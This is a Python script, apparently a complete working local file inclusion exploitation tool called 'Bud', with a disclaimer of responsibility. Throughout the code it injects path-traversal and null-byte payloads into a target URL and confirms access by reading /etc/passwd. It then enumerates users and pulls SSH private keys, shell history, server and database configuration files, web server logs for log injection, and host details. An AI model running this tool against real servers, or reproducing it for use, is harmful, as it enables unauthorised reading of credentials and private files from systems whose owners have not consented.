#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Bud Local File Inclusion thingy
# How you use this tool is not my responsibility

import requests
import optparse
import sys
import re
import random
try:
    from urllib import quote_plus
except ImportError:
    from urllib.parse import quote_plus


class Bud:
    url = ""
    use_null_byte = False
    extension = None
    print_content = False

    possibilities = {
        'absolute_path': '/%s',
        'relative_path': '../../../../../../../../../../../../%s'
    }

    sys_files = [
        '/etc/ssh/sshd_config',
        '/etc/mysql/my.cnf',
        '/etc/my.cnf',
        '/etc/apache2/apache2.conf',
        '/etc/apache2/httpd.conf',
        '/usr/local/lib/php.ini',
        '/var/log/syslog',
        '/var/lib/dhcp/dhclient.eth0.leases',
        '/etc/nginx/nginx.conf'
    ]

    include_files = [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/httpd/access.log',
        '/var/log/httpd/error.log',
        '/usr/local/apache/logs/access_log',
        '/usr/local/apache/logs/error_log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log'
    ]

    user_files = [
        '.ssh/authorized_keys',
        '.ssh/id_rsa.pub',
        '.ssh/id_rsa',
        '.profile',
        '.bash_history',
        '.bashrc'
    ]

    sys_info = {
        'hostname': '/etc/hostname',
        'os_version': '/etc/issue',
        'kernel': '/proc/version'
    }

    method = None
    false_text = None
    show_fail = True

    def line(self):
        print("#" * 60)

    def __init__(self, url, null_byte=None, ext=None):
        self.url = url
        self.use_null_byte = True if null_byte or ext else False
        if ext and ext.startswith('.'):
            ext = ext[1:]

        self.extension = ext


    def run(self):
        self.line()
        print("Testing injection point")
        result = self.check_injection()
        if result:
            print("Identified result using %s method" % result)
        else:
            if not self.use_null_byte:
                print("Unable to detect injection point, perhaps adding a null-byte will help?")
                sys.exit(0)
            print("Unable to detect injection point")
            sys.exit(0)
        self.method = result
        self.line()
        print("Enumerating users")
        users = self.enumerate_users()
        for user in users:
            usersplit = user.split('/')
            print("* %s" % usersplit[len(usersplit) - 1])
        self.line()
        print("Detecting not found pattern")
        invalid_file = self.create_injection(self.method, '%d.txt' % random.randint(9999, 99999))
        invalid_text = self.get_text(url.replace('*', invalid_file))
        self.is_false_positive(invalid_text)
        if self.false_text:
            print("Using pattern: \"%s\" as not found" % self.false_text)
        else:
            print("Unable to determine file not found error, further results may be invalid\n" +
                  "To avoid this manually inject the page with an invalid path " +
                  "and set the error text using the -e/--error parameter")
        self.line()
        print("Enumerating user files")
        for user in users:
            self.enumerate_user_files(user)

        self.line()
        print("Enumerating system files")
        self.enumerate_system_files()

        self.line()
        print("Checking for log injection")
        self.enumerate_log_files()

        self.line()
        print("Dumping system info")
        self.get_sysinfo()

        print("Done :)")

    def get_text(self, url, data=None):
        try:
            result = requests.get(url) if not data else requests.post(url, data)
            if result:
                return result.text
        except Exception as e:
            print("Oh no: %s" % str(e))
            return ""

    def enumerate_users(self):
        users = ['/root']
        passwd = self.create_injection(self.method, 'etc/passwd')
        passwdtext = self.get_text(url.replace('*', passwd))
        if passwdtext:
            for user in re.findall('(/home/\w+)', passwdtext):
                users.append(user)
            return users
        return []

    def is_false_positive(self, text):
        # also catches any requests errors cuz "" is returned
        if text.strip() == "":
            return True
        text = text.lower()
        if self.false_text:
            return self.false_text in text
        # generic errors
        if 'not found' in text:
            self.false_text = 'not found'

        # code errors
        if 'filenotfoundexception' in text:
            self.false_text = 'filenotfoundexception'
        if 'readfile(' in text:
            self.false_text = 'readfile('
        if 'include(' in text:
            self.false_text = 'include('
        if 'include_once(' in text:
            self.false_text = 'include_once('
        if 'file_get_contents(' in text:
            self.false_text = 'file_get_contents('
        if 'require(' in text:
            self.false_text = 'require('
        if 'require_once(' in text:
            self.false_text = 'require_once('
        if 'fopen(' in text:
            self.false_text = 'fopen('
        return False

    def enumerate_user_files(self, user):
        for user_file in self.user_files:
            filepath = "%s/%s" % (user, user_file)
            file_get = self.create_injection(self.method, filepath)
            file_text = self.get_text(self.url.replace('*', file_get))
            if not self.is_false_positive(file_text):
                print("* %s [OK]" % filepath)
                if self.print_content:
                    print(self.parse_content(file_text))
            else:
                if self.show_fail:
                    print("* %s [FAIL]" % filepath)

    def enumerate_system_files(self):
        for sysfile in self.sys_files:
            file_get = self.create_injection(self.method, sysfile)
            file_text = self.get_text(self.url.replace('*', file_get))
            if not self.is_false_positive(file_text):
                print("* %s [OK]" % sysfile)
                if self.print_content:
                    print(self.parse_content(file_text))
            else:
                if self.show_fail:
                    print("* %s [FAIL]" % sysfile)

    def enumerate_log_files(self):
        files = []
        for logfile in self.include_files:
            file_get = self.create_injection(self.method, logfile)
            file_text = self.get_text(self.url.replace('*', file_get))
            if not self.is_false_positive(file_text):
                print("* %s [OK]" % logfile)
                print("If either include() or require() is used as the vulnerable function " +
                      "this system might be vulnerable to log injection\n" +
                      "https://www.owasp.org/index.php/Log_Injection")
                if self.print_content:
                    print(self.parse_content(file_text))
            else:
                if self.show_fail:
                    print("* %s [FAIL]" % logfile)

    def get_sysinfo(self):
        for entry in self.sys_info:
            entry_file = self.sys_info[entry]
            file_get = self.create_injection(self.method, entry_file)
            file_text = self.get_text(self.url.replace('*', file_get))
            if not self.is_false_positive(file_text):
                print("* %s: %s (%s)" % (entry, file_text.replace('\n', '').strip(), entry_file))
            else:
                print("* %s: %s" % (entry, "n/a"))

    def parse_content(self, text):
        return text

    def create_injection(self, name, path):
        posibility = self.possibilities[name] % path
        if self.extension:
            posibility = "%s\0.%s" % (posibility, self.extension)
            posibility = quote_plus(posibility)
        elif self.use_null_byte:
            posibility = "%s\0" % posibility
            posibility = quote_plus(posibility)
        else:
            posibility = quote_plus(posibility)

        return posibility

    def check_injection(self):
        for posibility_name in self.possibilities:
            posibility = self.create_injection(posibility_name, 'etc/passwd')
            tmpurl = self.url.replace('*', posibility)
            result = self.get_text(tmpurl)
            if '0:0:root' in result:
                return posibility_name
        return None

if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option("-u", dest="url", default=None,
                      help="The URL to start with including an astrix (*) for the inject point")

    parser.add_option("-n", "--null-byte", action="store_true", dest="null_byte", default=False,
                      help="Use a null-byte to bypass suffix")

    parser.add_option("-e", "--error", dest="error_text", default=None,
                      help="Text to look for when a file is not found, default: auto detect")

    parser.add_option("-p", "--print", dest="print_files", action="store_true", default=False,
                      help="Text to look for when a file is not found, default: auto detect")

    parser.add_option("-i", "--ignore", dest="ignore_notfound", action="store_true", default=False,
                      help="Do not print files that are not found")

    parser.add_option("-f", "--fake-ext", dest="fake_extension", default=None,
                      help="Use null-byte followed by this fake extension (enables -n)")

    options, other = parser.parse_args()
    if not options.url:
        print("Error: Cannot start without URL")
        sys.exit(0)
    url = options.url
    if '*' not in url:
        print("Error: Cannot start without injection point")
        sys.exit(0)

    b = Bud(url, options.null_byte, options.fake_extension)
    b.false_text = options.error_text if options.error_text and len(options.error_text) else None
    b.print_content = options.print_files
    b.show_fail = not options.ignore_notfound
    b.run()
